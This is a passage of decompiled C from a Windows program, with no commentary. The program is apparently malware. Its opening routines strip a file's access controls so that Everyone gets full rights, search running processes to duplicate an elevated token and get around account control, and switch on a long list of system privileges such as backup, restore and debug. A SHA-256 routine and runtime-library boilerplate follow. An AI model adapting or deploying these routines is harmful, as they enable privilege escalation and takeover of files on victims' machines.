  *(_WORD *)&pIdentifierAuthority.Value[4] = 256;
  pSid = 0;
  NewAcl = 0;
  if ( AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0, 0, 0, 0, 0, 0, 0, 0, &pSid) )
  {
    v2 = 32;
    p_pListOfExplicitEntries = &pListOfExplicitEntries;
    do
    {
      LOBYTE(p_pListOfExplicitEntries->grfAccessPermissions) = 0;
      p_pListOfExplicitEntries = (struct _EXPLICIT_ACCESS_W *)((char *)p_pListOfExplicitEntries + 1);
      --v2;
    }
    while ( v2 );
    pListOfExplicitEntries.Trustee.ptstrName = (LPWCH)pSid;
    pListOfExplicitEntries.grfAccessPermissions = 0x10000000;
    pListOfExplicitEntries.grfAccessMode = SET_ACCESS;
    pListOfExplicitEntries.grfInheritance = 0;
    pListOfExplicitEntries.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    pListOfExplicitEntries.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    if ( !SetEntriesInAclW(1u, &pListOfExplicitEntries, 0, &NewAcl) )
      SetNamedSecurityInfoW(pObjectName, SE_FILE_OBJECT, 5u, pSid, 0, NewAcl, 0);
  }
  if ( pSid )
    FreeSid(pSid);
  result = NewAcl;
  if ( NewAcl )
    return (PACL)LocalFree(NewAcl);
  return result;
}

//----- (0040FC50) --------------------------------------------------------
void sub_40FC50()
{
  HANDLE CurrentProcess; // eax
  void (__stdcall *v1)(HANDLE); // edi
  ULONG v2; // esi
  void *v3; // eax
  _DWORD *i; // eax
  _DWORD *v5; // ebx
  HANDLE v6; // esi
  char v7[8]; // [esp+10h] [ebp-98h] BYREF
  int v8; // [esp+18h] [ebp-90h]
  int v9; // [esp+1Ch] [ebp-8Ch]
  char v10[8]; // [esp+48h] [ebp-60h] BYREF
  int v11; // [esp+50h] [ebp-58h]
  int v12; // [esp+54h] [ebp-54h]
  _DWORD *v13; // [esp+80h] [ebp-28h]
  int v14; // [esp+84h] [ebp-24h]
  int v15; // [esp+88h] [ebp-20h]
  int TokenInformation; // [esp+8Ch] [ebp-1Ch] BYREF
  HANDLE hObject; // [esp+90h] [ebp-18h] BYREF
  DWORD ReturnLength; // [esp+94h] [ebp-14h] BYREF
  void *TokenHandle; // [esp+98h] [ebp-10h] BYREF
  LPVOID lpMem; // [esp+9Ch] [ebp-Ch]
  HANDLE ExistingTokenHandle; // [esp+A0h] [ebp-8h] BYREF
  ULONG dwBytes; // [esp+A4h] [ebp-4h] BYREF

  if ( dword_4309DC )
  {
    CurrentProcess = GetCurrentProcess();
    if ( OpenProcessToken(CurrentProcess, 8u, &TokenHandle) )
    {
      v1 = (void (__stdcall *)(HANDLE))CloseHandle;
      if ( GetTokenInformation(TokenHandle, TokenElevationType, &TokenInformation, 4u, &ReturnLength)
        && TokenInformation == 2
        && GetTokenInformation(TokenHandle, TokenLinkedToken, &hObject, 4u, &ReturnLength) )
      {
        if ( GetTokenInformation(hObject, TokenStatistics, v10, 0x38u, &ReturnLength) )
        {
          v14 = v12;
          v15 = v11;
          NtQuerySystemInformation(SystemProcessInformation, 0, 0, &dwBytes);
          v2 = dwBytes;
          v3 = HeapAlloc(hHeap, 8u, dwBytes);
          lpMem = v3;
          if ( !v3 )
          {
            do
            {
              Sleep(0x64u);
              v3 = HeapAlloc(hHeap, 8u, v2);
              lpMem = v3;
            }
            while ( !v3 );
            v1 = (void (__stdcall *)(HANDLE))CloseHandle;
          }
          if ( !NtQuerySystemInformation(SystemProcessInformation, v3, dwBytes, &dwBytes) )
          {
            for ( i = lpMem; ; i = v13 )
            {
              v5 = i;
              v13 = (_DWORD *)((char *)i + *i);
              v6 = OpenProcess(0x400u, 0, i[17]);
              if ( v6 )
              {
                if ( OpenProcessToken(v6, 0xAu, &ExistingTokenHandle) )
                {
                  if ( GetTokenInformation(ExistingTokenHandle, TokenStatistics, v7, 0x38u, &dwBytes)
                    && v8 == v15
                    && v9 == v14
                    && DuplicateToken(ExistingTokenHandle, SecurityImpersonation, &DuplicateTokenHandle) )
                  {
                    sub_408990((int)L"%ls Token Duplicated", v5[15]);
                    v1(ExistingTokenHandle);
                    v1(v6);
                    break;
                  }
                  v1(ExistingTokenHandle);
                }
                v1(v6);
              }
              if ( !*v5 )
                break;
            }
          }
          HeapFree(hHeap, 0, lpMem);
        }
        v1(hObject);
      }
      v1(TokenHandle);
    }
  }
}
// 42BC44: using guessed type wchar_t aLsTokenDuplica[21];
// 4309DC: using guessed type int dword_4309DC;
// 40FC50: using guessed type char var_60[8];
// 40FC50: using guessed type char var_98[8];

//----- (0040FE30) --------------------------------------------------------
ULONG sub_40FE30()
{
  ULONG *v0; // esi
  ULONG result; // eax
  int v2[15]; // [esp+Ch] [ebp-40h] BYREF
  unsigned __int8 OldValue; // [esp+4Bh] [ebp-1h] BYREF

  v0 = (ULONG *)v2;
  result = 3;
  v2[0] = 17;
  v2[1] = 20;
  v2[2] = 36;
  v2[3] = 29;
  v2[4] = 14;
  v2[5] = 5;
  v2[6] = 33;
  v2[7] = 28;
  v2[8] = 13;
  v2[9] = 18;
  v2[10] = 8;
  v2[11] = 11;
  v2[12] = 9;
  v2[13] = 19;
  v2[14] = 0;
  OldValue = 0;
  do
  {
    RtlAdjustPrivilege(result, 1u, 0, &OldValue);
    result = *v0++;
  }
  while ( result );
  return result;
}

//----- (0040FEE0) --------------------------------------------------------
int __fastcall sub_40FEE0(_DWORD *a1, int a2)
{
  char *v2; // eax
  int v3; // esi
  int v4; // edi
  int v5; // edx
  unsigned int v6; // ecx
  int v7; // edx
  unsigned int v8; // ecx
  int v9; // edx
  unsigned int v10; // ecx
  int v11; // edx
  char *v12; // ebx
  unsigned int v13; // edx
  unsigned int v14; // esi
  int v15; // edi
  bool v16; // sf
  _DWORD *v17; // edi
  int v18; // edx
  int v19; // esi
  int v20; // ecx
  int v21; // eax
  int v22; // esi
  int v23; // eax
  int v24; // esi
  char *v25; // ebx
  int v26; // esi
  int v27; // esi
  int v28; // esi
  int v29; // esi
  int v30; // esi
  _DWORD *v31; // ebx
  int result; // eax
  char v33; // [esp+Ch] [ebp-12Ch] BYREF
  char v34; // [esp+10h] [ebp-128h] BYREF
  int v35; // [esp+10Ch] [ebp-2Ch]
  _DWORD *v36; // [esp+110h] [ebp-28h]
  int v37; // [esp+114h] [ebp-24h]
  int v38; // [esp+118h] [ebp-20h]
  int v39; // [esp+11Ch] [ebp-1Ch]
  int v40; // [esp+120h] [ebp-18h]
  int v41; // [esp+124h] [ebp-14h]
  int v42; // [esp+128h] [ebp-10h]
  int v43; // [esp+12Ch] [ebp-Ch]
  int v44; // [esp+130h] [ebp-8h]
  int v45; // [esp+134h] [ebp-4h]

  v36 = a1;
  v2 = &v33;
  v3 = a2 + 8;
  v4 = 4;
  do
  {
    v5 = *(_DWORD *)(v3 - 8);
    v3 += 16;
    v6 = __ROL4__(v5, 8) & 0xFF00FF | __ROR4__(v5, 8) & 0xFF00FF00;
    v7 = *(_DWORD *)(v3 - 20);
    *(_DWORD *)v2 = v6;
    v8 = __ROL4__(v7, 8) & 0xFF00FF | __ROR4__(v7, 8) & 0xFF00FF00;
    v9 = *(_DWORD *)(v3 - 16);
    *((_DWORD *)v2 + 1) = v8;
    v10 = __ROL4__(v9, 8) & 0xFF00FF | __ROR4__(v9, 8) & 0xFF00FF00;
    v11 = *(_DWORD *)(v3 - 12);
    *((_DWORD *)v2 + 2) = v10;
    *((_DWORD *)v2 + 3) = __ROL4__(v11, 8) & 0xFF00FF | __ROR4__(v11, 8) & 0xFF00FF00;
    v2 += 16;
    --v4;
  }
  while ( v4 );
  v45 = 47;
  v12 = &v34;
  do
  {
    v13 = *((_DWORD *)v12 + 13);
    v2 += 4;
    v14 = *(_DWORD *)v12;
    v12 += 4;
    v15 = *((_DWORD *)v12 - 2)
        + *((_DWORD *)v12 + 7)
        + ((v14 >> 3) ^ __ROR4__(v14, 7) ^ __ROL4__(v14, 14))
        + ((v13 >> 10) ^ __ROL4__(v13, 13) ^ __ROL4__(v13, 15));
    v16 = --v45 < 0;
    *((_DWORD *)v2 - 1) = v15;
  }
  while ( !v16 );
  v17 = &unk_42A270;
  v37 = 15;
  v18 = v36[2];
  v19 = v36[7];
  v35 = v18;
  v40 = v36[3];
  v20 = v36[4];
  v43 = v20;
  v21 = v36[5];
  v41 = v19;
  v22 = v36[8];
  v39 = v21;
  v23 = v36[6];
  v38 = v22;
  v24 = v36[9];
  v25 = &v33;
  v44 = v18;
  v42 = v23;
  v45 = v24;
  while ( 1 )
  {
    v26 = v45
        + *v17
        + *(_DWORD *)v25
        + (v38 ^ v42 & (v41 ^ v38))
        + (__ROR4__(v42, 6) ^ __ROL4__(v23, 7) ^ __ROR4__(v23, 11));
    v45 = v26 + v39;
    v39 = v26 + (__ROR4__(v44, 2) ^ __ROL4__(v44, 10) ^ __ROR4__(v18, 13)) + (v40 & v43 | v44 & (v40 | v20));
    v27 = v38
        + v17[1]
        + *((_DWORD *)v25 + 1)
        + (v41 ^ v45 & (v42 ^ v41))
        + (__ROR4__(v45, 6) ^ __ROL4__(v45, 7) ^ __ROR4__(v45, 11));
    v38 = v27 + v43;
    v43 = v27 + (__ROR4__(v39, 2) ^ __ROL4__(v39, 10) ^ __ROR4__(v39, 13)) + (v44 & v40 | v39 & (v44 | v40));
    v28 = v17[2]
        + *((_DWORD *)v25 + 2)
        + (v42 ^ v38 & (v45 ^ v42))
        + (__ROR4__(v38, 6) ^ __ROL4__(v38, 7) ^ __ROR4__(v38, 11));
    v25 += 16;
    v29 = v41 + v28;
    v17 += 4;
    v41 = v29 + v40;
    v40 = v29 + (__ROR4__(v43, 2) ^ __ROL4__(v43, 10) ^ __ROR4__(v43, 13)) + (v39 & v44 | v43 & (v39 | v44));
    v30 = v42
        + *(v17 - 1)
        + *((_DWORD *)v25 - 1)
        + (v45 ^ v41 & (v38 ^ v45))
        + (__ROR4__(v41, 6) ^ __ROL4__(v41, 7) ^ __ROR4__(v41, 11));
    v23 = v30 + v44;
    v18 = v30 + (v43 & v39 | v40 & (v43 | v39)) + (__ROR4__(v40, 2) ^ __ROL4__(v40, 10) ^ __ROR4__(v40, 13));
    v42 = v30 + v44;
    v16 = --v37 < 0;
    v44 = v18;
    if ( v16 )
      break;
    v20 = v43;
  }
  v31 = v36;
  v36[2] = v18 + v35;
  v31[3] += v40;
  v31[4] += v43;
  v31[5] += v39;
  v31[6] += v42;
  v31[7] += v41;
  v31[8] += v38;
  result = v45;
  v31[9] += v45;
  return result;
}

//----- (004101D0) --------------------------------------------------------
void __usercall sub_4101D0(char *a1@<edx>, _DWORD *a2@<ecx>, unsigned int a3)
{
  unsigned int v3; // ebx
  size_t v5; // ecx
  size_t v6; // edi
  int v7; // ecx
  char *v8; // [esp+8h] [ebp-4h]

  v3 = a3;
  v8 = a1;
  if ( a3 )
  {
    v5 = a2[10];
    do
    {
      v6 = v3;
      if ( 64 - v5 <= v3 )
        v6 = 64 - v5;
      memmove((char *)a2 + v5 + 44, a1, v6);
      v7 = a2[10];
      *(_QWORD *)a2 += 8 * v6;
      v5 = v6 + v7;
      a1 = &v8[v6];
      a2[10] = v5;
      v3 -= v6;
      v8 += v6;
      if ( v5 == 64 )
      {
        sub_40FEE0(a2, (int)(a2 + 11));
        a1 = v8;
        v5 = 0;
        a2[10] = 0;
      }
    }
    while ( v3 );
  }
}

//----- (00410250) --------------------------------------------------------
void __fastcall sub_410250(char *a1, _BYTE *a2)
{
  unsigned int v3; // eax
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  char v11; // al
  int v12; // ecx
  char v13; // al
  __int64 v14; // [esp+10h] [ebp-7Ch] BYREF
  int v15; // [esp+18h] [ebp-74h]
  int v16; // [esp+1Ch] [ebp-70h]
  int v17; // [esp+20h] [ebp-6Ch]
  int v18; // [esp+24h] [ebp-68h]
  int v19; // [esp+28h] [ebp-64h]
  int v20; // [esp+2Ch] [ebp-60h]
  int v21; // [esp+30h] [ebp-5Ch]
  int v22; // [esp+34h] [ebp-58h]
  int v23; // [esp+38h] [ebp-54h]
  int v24[3]; // [esp+80h] [ebp-Ch] BYREF

  v15 = 1779033703;
  v16 = -1150833019;
  v14 = 0i64;
  v17 = 1013904242;
  v18 = -1521486534;
  v19 = 1359893119;
  v20 = -1694144372;
  v21 = 528734635;
  v22 = 1541459225;
  v23 = 0;
  sub_4101D0(a1, &v14, 0x20u);
  v24[1] = __ROL4__(v14, 8) & 0xFF00FF | __ROR4__(v14, 8) & 0xFF00FF00;
  v3 = 120 - v23 - 64;
  v24[0] = __ROL4__(HIDWORD(v14), 8) & 0xFF00FF | __ROR4__(HIDWORD(v14), 8) & 0xFF00FF00;
  if ( (unsigned int)(120 - v23) <= 0x40 )
    v3 = 120 - v23;
  sub_4101D0(byte_42A370, &v14, v3);
  sub_4101D0((char *)v24, &v14, 8u);
  if ( a2 )
  {
    v4 = v15;
    *a2 = HIBYTE(v15);
    a2[1] = BYTE2(v4);
    a2[3] = v15;
    a2[2] = BYTE1(v4);
    v5 = v16;
    a2[4] = HIBYTE(v16);
    a2[5] = BYTE2(v5);
    a2[7] = v16;
    a2[6] = BYTE1(v5);
    v6 = v17;
    a2[8] = HIBYTE(v17);
    a2[9] = BYTE2(v6);
    a2[11] = v17;
    a2[10] = BYTE1(v6);
    v7 = v18;
    a2[12] = HIBYTE(v18);
    a2[13] = BYTE2(v7);
    a2[15] = v18;
    a2[14] = BYTE1(v7);
    v8 = v19;
    a2[16] = HIBYTE(v19);
    a2[17] = BYTE2(v8);
    a2[19] = v19;
    a2[18] = BYTE1(v8);
    v9 = v20;
    a2[20] = HIBYTE(v20);
    a2[21] = BYTE2(v9);
    a2[23] = v20;
    a2[22] = BYTE1(v9);
    v10 = v21;
    a2[24] = HIBYTE(v21);
    a2[25] = BYTE2(v10);
    v11 = v21;
    a2[26] = BYTE1(v10);
    v12 = v22;
    a2[27] = v11;
    a2[28] = HIBYTE(v12);
    a2[29] = BYTE2(v12);
    v13 = v22;
    a2[30] = BYTE1(v12);
    a2[31] = v13;
  }
}

//----- (00410463) --------------------------------------------------------
void __cdecl sub_410463(void *Block)
{
  j__free(Block);
}

//----- (0041047A) --------------------------------------------------------
_DWORD *__thiscall sub_41047A(_DWORD *Block, char a2)
{
  *Block = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 424424: using guessed type void *type_info::`vftable';

//----- (00410548) --------------------------------------------------------
int sub_410548()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 410B28: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (00410550) --------------------------------------------------------
int sub_410550()
{
  int v0; // eax

  sub_410CF1();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (004106E8) --------------------------------------------------------
std::exception *__thiscall sub_4106E8(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 42444C: using guessed type void *std::bad_alloc::`vftable';

//----- (00410703) --------------------------------------------------------
_DWORD *__thiscall sub_410703(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad allocation";
  *this = &std::bad_alloc::`vftable';
  return result;
}
// 42444C: using guessed type void *std::bad_alloc::`vftable';

//----- (0041071B) --------------------------------------------------------
std::exception *__thiscall sub_41071B(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}
// 424468: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00410736) --------------------------------------------------------
_DWORD *__thiscall sub_410736(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad array new length";
  *this = &std::bad_array_new_length::`vftable';
  return result;
}
// 424468: using guessed type void *std::bad_array_new_length::`vftable';

//----- (004107B8) --------------------------------------------------------
void __noreturn sub_4107B8()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_410703(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 4107B8: using guessed type void __noreturn sub_4107B8();
// 4107B8: using guessed type _DWORD pExceptionObject[3];

//----- (004107D5) --------------------------------------------------------
void __noreturn sub_4107D5()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_410736(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 4107D5: using guessed type void __noreturn sub_4107D5();
// 4107D5: using guessed type _DWORD pExceptionObject[3];

//----- (00410AE8) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (00410AEB) --------------------------------------------------------
int sub_410AEB()
{
  return 1;
}

//----- (00410AF5) --------------------------------------------------------
void sub_410AF5()
{
  InitializeSListHead(&ListHead);
}

//----- (00410B01) --------------------------------------------------------
char sub_410B01()
{
  return 1;
}

//----- (00410B45) --------------------------------------------------------
BOOL sub_410B45()
{
  return dword_42F004 == 0;
}
// 42F004: using guessed type int dword_42F004;

//----- (00410B51) --------------------------------------------------------
void *sub_410B51()
{
  return &unk_430A88;
}

//----- (00410B57) --------------------------------------------------------
void *sub_410B57()
{
  return &unk_430A84;
}

//----- (00410CF1) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_410CF1()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (00410D53) --------------------------------------------------------
void sub_410D53()
{
  dword_42FD48 = 0;
}
// 42FD48: using guessed type int dword_42FD48;

//----- (00410D5B) --------------------------------------------------------
void sub_410D5B()
{
  ;
}
// 410D5B: could not find valid save-restore pair for edi

//----- (00410D87) --------------------------------------------------------
void __cdecl sub_410D87()
{
  ;
}
// 410D87: could not find valid save-restore pair for edi

//----- (004111B6) --------------------------------------------------------
int sub_4111B6()
{
  return dword_430078;
}
// 430078: using guessed type int dword_430078;

//----- (00411CC0) --------------------------------------------------------
int __usercall sub_411CC0@<eax>(int (*a1)(void)@<eax>)
{
  return a1();
}

//----- (00412549) --------------------------------------------------------
int __cdecl sub_412549(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1040]; // [esp+6Ch] [ebp-41Ch] BYREF
  int v20; // [esp+47Ch] [ebp-Ch]

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_7(&v17, a1, a2, a5, v12, a7);
  v20 = 0;
  v9 = sub_4130AF((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 412D2D: using guessed type _DWORD __stdcall unknown_libname_7(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 412549: using guessed type char var_45C[64];
// 412549: using guessed type char var_41C[1040];

//----- (004126C7) --------------------------------------------------------
int __cdecl sub_4126C7(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1040]; // [esp+6Ch] [ebp-41Ch] BYREF
  int v20; // [esp+47Ch] [ebp-Ch]

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_8(&v17, a1, a2, a5, v12, a7);
  v20 = 0;
  v9 = sub_4131C3((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_WORD *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_WORD *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_WORD *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 412D69: using guessed type _DWORD __stdcall unknown_libname_8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4126C7: using guessed type char var_45C[64];
// 4126C7: using guessed type char var_41C[1040];

//----- (004130AF) --------------------------------------------------------
int __thiscall sub_4130AF(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_25(this + 1096) )
    return -1;
  if ( !*(_DWORD *)(this + 16) )
  {
LABEL_3:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
LABEL_20:
  while ( ++*(_DWORD *)(this + 1104) != 2 )
  {
    *(_DWORD *)(this + 56) = 0;
    *(_DWORD *)(this + 28) = 0;
    while ( 1 )
    {
      v5 = **(_BYTE **)(this + 16);
      *(_BYTE *)(this + 49) = v5;
      if ( !v5 )
        break;
      ++*(_DWORD *)(this + 16);
      if ( *(int *)(this + 24) < 0 )
        goto LABEL_20;
      v3 = unknown_libname_10(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
      *(_DWORD *)(this + 28) = v3;
      if ( v3 == 8 )
        goto LABEL_3;
      switch ( v3 )
      {
        case 0:
          v4 = sub_413359((char *)this);
          break;
        case 1:
          *(_DWORD *)(this + 40) = -1;
          *(_DWORD *)(this + 36) = 0;
          *(_BYTE *)(this + 48) = 0;
          *(_DWORD *)(this + 32) = 0;
          *(_DWORD *)(this + 44) = 0;
          *(_BYTE *)(this + 60) = 0;
          continue;
        case 2:
          v4 = unknown_libname_13(this);
          break;
        case 3:
          v4 = sub_413BE2(this);
          break;
        case 4:
          *(_DWORD *)(this + 40) = 0;
          continue;
        case 5:
          v4 = sub_413440(this);
          break;
        case 6:
          v4 = sub_41348D((_BYTE *)this);
          break;
        case 7:
          v4 = sub_413753(this);
          break;
        default:
          return -1;
      }
      if ( !v4 )
        return -1;
    }
    ++*(_DWORD *)(this + 16);
  }
  return *(_DWORD *)(this + 24);
}
// 412EF1: using guessed type _DWORD __stdcall unknown_libname_10(char, _DWORD);
// 4132DF: using guessed type int __thiscall unknown_libname_13(_DWORD);
// 413440: using guessed type int __thiscall sub_413440(_DWORD);
// 4145E4: using guessed type int __thiscall unknown_libname_25(_DWORD);

//----- (004131C3) --------------------------------------------------------
int __thiscall sub_4131C3(int this)
{
  int v3; // eax
  char v4; // al
  __int16 v5; // ax

  if ( !(unsigned __int8)unknown_libname_25(this + 1096) )
    return -1;
  if ( !*(_DWORD *)(this + 16) )
  {
LABEL_3:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
LABEL_20:
  while ( ++*(_DWORD *)(this + 1104) != 2 )
  {
    *(_DWORD *)(this + 56) = 0;
    *(_DWORD *)(this + 28) = 0;
    while ( 1 )
    {
      v5 = **(_WORD **)(this + 16);
      *(_WORD *)(this + 50) = v5;
      if ( !v5 )
        break;
      *(_DWORD *)(this + 16) += 2;
      if ( *(int *)(this + 24) < 0 )
        goto LABEL_20;
      v3 = unknown_libname_11(*(unsigned __int16 *)(this + 50), *(_DWORD *)(this + 28));
      *(_DWORD *)(this + 28) = v3;
      if ( v3 == 8 )
        goto LABEL_3;
      switch ( v3 )
      {
        case 0:
          v4 = sub_413378();
          break;
        case 1:
          *(_DWORD *)(this + 40) = -1;
          *(_DWORD *)(this + 36) = 0;
          *(_BYTE *)(this + 48) = 0;
          *(_DWORD *)(this + 32) = 0;
          *(_DWORD *)(this + 44) = 0;
          *(_BYTE *)(this + 60) = 0;
          continue;
        case 2:
          v4 = unknown_libname_14(this);
          break;
        case 3:
          v4 = sub_413C0D(this);
          break;
        case 4:
          *(_DWORD *)(this + 40) = 0;
          continue;
        case 5:
          v4 = sub_413466(this);
          break;
        case 6:
          v4 = sub_4135DB((_DWORD *)this);
          break;
        case 7:
          v4 = sub_413985(this);
          break;
        default:
          return -1;
      }
      if ( !v4 )
        return -1;
    }
    *(_DWORD *)(this + 16) += 2;
  }
  return *(_DWORD *)(this + 24);
}
// 412F28: using guessed type _DWORD __stdcall unknown_libname_11(_DWORD, _DWORD);
// 41331C: using guessed type int __thiscall unknown_libname_14(_DWORD);
// 4145E4: using guessed type int __thiscall unknown_libname_25(_DWORD);

//----- (00413359) --------------------------------------------------------
char __thiscall sub_413359(char *this)
{
  if ( sub_413397(this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (00413378) --------------------------------------------------------
char sub_413378()
{
  if ( (unsigned __int8)unknown_libname_15() )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}
// 4133C1: using guessed type int unknown_libname_15(void);

//----- (00413397) --------------------------------------------------------
char __thiscall sub_413397(char *this)
{
  char result; // al

  result = unknown_libname_16(0);
  if ( result )
  {
    __crt_stdio_output::string_output_adapter<char>::write_character(this[49], this + 24);
    return 1;
  }
  return result;
}
// 4133DC: using guessed type _DWORD __stdcall unknown_libname_16(_DWORD);
// 4145FF: using guessed type _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD);

//----- (00413466) --------------------------------------------------------
char __thiscall sub_413466(int this)
{
  int *v1; // edx
  int v3; // eax

  v1 = (int *)(this + 40);
  if ( *(_WORD *)(this + 50) != 42 )
    return sub_413039(this + 40);
  *(_DWORD *)(this + 20) += 4;
  v3 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *v1 = v3;
  if ( v3 < 0 )
    *v1 = -1;
  return 1;
}
// 413039: using guessed type _DWORD __stdcall sub_413039(_DWORD);

//----- (0041348D) --------------------------------------------------------
char __thiscall sub_41348D(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  int v4; // eax
  char *v5; // edx
  char v6; // al
  _BYTE *v7; // eax
  int v8; // [esp-4h] [ebp-4h]

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_413753((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *((_DWORD *)this + 11) )
    goto LABEL_7;
  if ( v1 > 106 )
  {
    if ( v1 != 108 )
    {
      switch ( v1 )
      {
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
